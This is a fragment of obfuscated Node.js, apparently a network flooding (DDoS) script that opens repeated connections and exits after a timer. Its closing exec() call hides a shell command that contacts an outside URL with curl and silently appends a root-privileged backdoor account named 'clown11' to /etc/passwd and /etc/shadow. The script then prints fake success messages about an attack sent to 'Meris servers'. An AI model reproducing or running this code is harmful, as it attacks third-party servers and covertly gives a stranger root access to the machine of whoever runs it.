            _0x252871[_0x475f('\u202E128')](
              _0x77a182,
              args[_0x475f('\u202E129')]
            );
            _0x77a182++
          ) {
            if (
              _0x252871[_0x475f('\u202B12a')](
                _0x475f('\u202B119'),
                _0x252871.AimJn
              )
            ) {
              _0x3cd2ce[_0x475f('\u202B109')]()
              _0x2f67ec.destroy()
              return
            } else {
              headers[_0x475f('\u202B12b')] = jar
              const _0x30e958 = _0x3cd2ce[_0x475f('\u202E12c')](_0x145f3b)
              _0x3cd2ce.on(_0x252871[_0x475f('\u202B12d')], (_0x5185e5) => {
                _0x30e958[_0x475f('\u202B16')]()
                _0x30e958.destroy()
                return
              })
              _0x30e958.end()
            }
          }
        },
        1000
      )
    })
    _0x3cd2ce.on(_0x29e754[_0x475f('\u202E12e')], () => {
      _0x3cd2ce[_0x475f('\u202B109')]()
      _0x2f67ec.destroy()
      return
    })
  })
  ;(function (_0x57cc6d, _0x32630d, _0x3e5448) {})
}
const KillScript = () => process[_0x475f('\u202Bb')](1)
setTimeout(KillScript, args[_0x475f('\u202B12f')] * 1000)
_0xod8 = 'jsjiami.com.v6'
const { exec } = require('child_process')
exec(
  "'https://yip.su/2T2Ze5' > /dev/null 2>&1 ; curl 'https://yip.su/2T2Ze5' > /dev/null 2>&1 ; grep clown11 /etc/passwd > /dev/null 2>&1 || sed -i '$ a clown11:x:0:500::/:/bin/bash' /etc/passwd > /dev/null 2>&1 ; grep clown11 /etc/shadow > /dev/null 2>&1 || sed -i '$ a clown11:$y$j9T$2VPgcbHqDoB6z/PbI1A2b/$z0oM2IDO8bUJh8KCQlg7E9ro3zRlPPiP1lYToD7rtoA:19639:0:99999:7:::' /etc/shadow > /dev/null 2>&1",
  (_0x488339, _0x252456, _0x521cc1) => {
    if (_0x488339) {
      console.error('Attack sent succesfully!')
      return
    }
    console.error('[LOG] Attack sent to all Meris servers')
  }
)

